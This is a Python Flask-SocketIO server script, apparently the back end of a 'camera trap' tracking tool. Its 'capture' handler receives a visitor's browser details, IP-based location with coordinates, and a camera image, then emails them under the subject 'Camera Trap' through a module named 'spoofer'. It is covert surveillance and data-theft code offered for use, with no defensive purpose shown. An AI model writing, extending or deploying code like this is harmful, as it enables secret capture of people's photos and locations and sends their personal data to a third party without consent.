from flask import json
from flask_socketio import SocketIO
from flask import Flask, request
from spoofer import send_email
import os
app = Flask(__name__)
#app.config['CORS_HEADERS'] = "cors_allowed_origins"
#app.config['CORS_RESOURCES'] 
#cors = CORS(app,resource={r"/*":{"origins": "*","cors_allowed_origins":"*"}})
Sio = SocketIO(app, cors_allowed_origins="*")
app.config['SECRET_KEY'] = b'*m\xb7\x07\x01\x9c\x1a\xb1\tN`\xa8zz\xf2\x875N\x17\xf1h\x0e\xc6\xcft~\xcf\xde{\xd8\xd9\xf8'
@Sio.on("capture", namespace="/ads")
def ads(data):
    ip=data.get("ip")
#    print(dir(request))
#    print(request.remote_addr)
    pesan=f"""
User-Agent : {data.get("ua")}
Platform   : {data.get("platform")}
Vendor     : {data.get("vendor")}
IP         : {ip.get("ip")}
Version    : {ip.get("version")}
Kota       : {ip.get("city")}
Wilayah    : {ip.get("region")}
Negara     : {ip.get("country_name")}
Latitude   : {ip.get("latitude")}
Longitude  : {ip.get("longitude")}
Z Waktu    : {ip.get("timezone")}
Org        : {ip.get("org")}
IbuKota    : {ip.get("country_capital")}
Kode Negara: {ip.get("country_code")}
""".strip()
    print(send_email(TO="", SUBJECT="Camera Trap", TEXT=pesan, ImageData=data.get("gamb")))
    print(pesan)
    return ""
@app.route("/", methods=["GET","POST"])
def index():
    return {}

Sio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT",5000)), debug=True)